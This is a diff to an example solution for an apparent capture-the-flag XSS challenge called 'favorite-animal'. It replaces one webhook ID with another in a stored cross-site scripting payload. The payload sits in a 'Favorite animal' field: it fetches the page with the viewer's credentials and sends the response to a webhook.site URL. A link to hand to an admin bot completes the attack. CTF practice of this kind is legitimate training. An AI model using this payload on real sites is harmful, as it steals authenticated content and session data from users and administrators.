@@ -1,6 +1,6 @@
 Example solution:
 
 Username: test123
-Favorite animal: <script>fetch("/", {credentials: "include"}).then(r => r.text()).then(r => fetch("https://webhook.site/3b2c1ddb-f025-4a2d-8912-b109b952fe2e?cookies=" + encodeURIComponent(r)))</script>
+Favorite animal: <script>fetch("/", {credentials: "include"}).then(r => r.text()).then(r => fetch("https://webhook.site/fa5afed5-76d6-434c-9fbc-75b74f83a8e1?cookies=" + encodeURIComponent(r)))</script>
 
 Link to send to admin bot: http://favorite-animal.acmcyber.com/?username=test123
